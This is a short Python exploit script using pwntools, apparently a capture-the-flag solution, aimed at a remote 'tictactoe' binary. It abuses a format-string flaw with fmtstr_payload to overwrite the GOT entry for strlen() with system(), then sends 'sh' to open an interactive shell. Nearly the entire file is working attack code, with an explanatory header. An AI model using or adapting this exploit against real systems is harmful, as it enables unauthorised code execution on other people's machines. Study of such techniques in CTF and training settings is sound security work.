"""
===========================================================================
🎯 Objective: Hijack Execution Flow to Shell
💣 Vulnerability: Format String (GOT Overwrite)
⚔️ Method:
  1. Exploits an unsafe printf-style function by using pwntools' fmtstr_payload.
  2. Crafts a payload of %n format specifiers to overwrite the Global Offset Table (GOT) entry of strlen() with the address of system().
  3. Sends the string "sh", which is passed to the hijacked strlen(), effectively executing system("sh").
===========================================================================
"""

from pwn import *

exe = ELF('./tictactoe')
context.binary = exe 

r = remote(xxxxxxxxx)

offset = 15 

# GOT corruption:
payload_1 = fmtstr_payload(offset, {exe.got['strlen']: exe.sym['system']})
r.sendlineafter(b"Your move: ", payload_1)
print("[+] GOT sovrascritta con successo. strlen() ora è system()!")

payload_2 = b"sh"
r.sendlineafter(b"Your move: ", payload_2)

print("[*] GG ")
r.interactive()
